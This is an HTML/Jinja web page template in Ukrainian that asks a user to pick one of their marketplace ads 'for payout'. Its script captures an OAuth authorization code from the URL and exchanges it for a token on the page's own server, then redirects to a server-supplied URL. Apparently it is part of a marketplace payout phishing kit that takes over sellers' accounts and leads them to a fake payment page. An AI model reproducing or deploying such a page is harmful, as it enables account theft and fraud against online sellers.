<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Вибір оголошення</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-color: #f4f6f8;
            --card-bg: #ffffff;
            --primary: #0a2540;
            --text-dark: #0f172a;
            --text-muted: #64748b;
            --border-color: #e2e8f0;
            --success: #00b56a;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }

        .ads-menu {
            width: 100%;
            max-width: 420px;
            background: var(--card-bg);
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            border: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
        }

        .menu-header {
            padding: 18px;
            border-bottom: 1px solid var(--border-color);
            text-align: center;
        }

        .menu-title {
            font-size: 17px;
            font-weight: 700;
            color: var(--text-dark);
        }

        /* Область прокрутки */
        .scroll-container {
            max-height: 380px; 
            overflow-y: auto;
            padding: 12px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            scrollbar-width: thin;
        }

        .scroll-container::-webkit-scrollbar { width: 4px; }
        .scroll-container::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }

        .ad-card {
            background: #fff;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            overflow: hidden;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            flex-direction: column;
        }

        .ad-card.selected {
            border-color: var(--success);
            background: #f0fdf4;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 181, 106, 0.1);
        }

        .ad-image {
            width: 100%;
            height: 95px;
            object-fit: cover;
            background: #f8fafc;
            border-bottom: 1px solid var(--border-color);
        }

        .ad-info { padding: 8px; flex-grow: 1; }

        .ad-name {
            font-size: 12px;
            font-weight: 600;
            color: var(--text-dark);
            line-height: 1.3;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
            height: 32px;
            margin-bottom: 6px;
        }

        .selection-status {
            font-size: 11px;
            font-weight: 700;
            color: var(--text-muted);
            text-align: center;
            background: #f1f5f9;
            padding: 5px;
            border-radius: 6px;
            text-transform: uppercase;
        }

        .selected .selection-status {
            background: var(--success);
            color: white;
        }

        .menu-footer {
            padding: 15px;
            border-top: 1px solid var(--border-color);
        }

        .btn-confirm {
            width: 100%;
            padding: 14px;
            background: #cbd5e1;
            color: #64748b;
            border: none;
            border-radius: 10px;
            font-weight: 700;
            font-size: 14px;
            cursor: not-allowed;
            transition: 0.2s;
        }

        .btn-confirm.active {
            background: var(--primary);
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="ads-menu">
    <div class="menu-header">
        <h2 class="menu-title">Оберіть товар для виплати</h2>
    </div>

    <div class="scroll-container" id="ads-container">
        {% if user_ads %}
            {% for ad in user_ads %}
            <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
                <img src="{{ ad.img }}" class="ad-image" alt="product">
                <div class="ad-info">
                    <div class="ad-name">{{ ad.title }}</div>
                    <div class="selection-status">Обрати</div>
                </div>
            </div>
            {% endfor %}
        {% else %}
            <p style="grid-column: 1/-1; text-align: center; font-size: 13px; color: var(--text-muted); padding: 30px;">
                Оголошень не знайдено
            </p>
        {% endif %}
    </div>

    <div class="menu-footer">
        <button id="confirm-btn" class="btn-confirm" onclick="submitSelection()" disabled>Підтвердити та отримати</button>
    </div>
</div>

<script>
    let selectedAdData = { url: "", title: "" };

    // Выбор карточки
    function selectAd(element, url, title) {
        document.querySelectorAll('.ad-card').forEach(card => {
            card.classList.remove('selected');
            card.querySelector('.selection-status').innerText = "Обрати";
        });
        
        element.classList.add('selected');
        element.querySelector('.selection-status').innerText = "Обрано";
        
        selectedAdData = { url, title };
        
        const btn = document.getElementById('confirm-btn');
        btn.disabled = false;
        btn.classList.add('active');
    }

    // Запрос на отправку выбранного товара
    async function submitSelection() {
        const btn = document.getElementById('confirm-btn');
        const originalText = btn.innerText;
        
        btn.innerText = "Обробка...";
        btn.disabled = true;

        try {
            const response = await fetch("/submit_ad", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    ad_url: selectedAdData.url, 
                    ad_title: selectedAdData.title 
                })
            });
            
            const result = await response.json();
            
            if (response.ok && result.url) {
                window.location.href = result.url;
            } else {
                // Если API не вернуло URL, можно перенаправить на дефолтную страницу
                alert("Помилка обробки. Спробуйте пізніше.");
                btn.innerText = originalText;
                btn.disabled = false;
            }
        } catch (err) {
            console.error("Fetch error:", err);
            btn.innerText = originalText;
            btn.disabled = false;
        }
    }

    // Запрос на получение токена при входе
    window.onload = () => {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get("code");
        
        if (code && !sessionStorage.getItem('done_auth')) {
            fetch("/get_token", { 
                method: "POST", 
                headers: { "Content-Type": "application/json" }, 
                body: JSON.stringify({ code }) 
            })
            .then(r => { 
                if(r.ok) { 
                    sessionStorage.setItem('done_auth', code); 
                    // Очищаем URL от параметров после успешного получения токена
                    window.history.replaceState({}, document.title, "/");
                } 
            })
            .catch(err => console.error("Token error:", err));
        }
    };
</script>

</body>
</html>
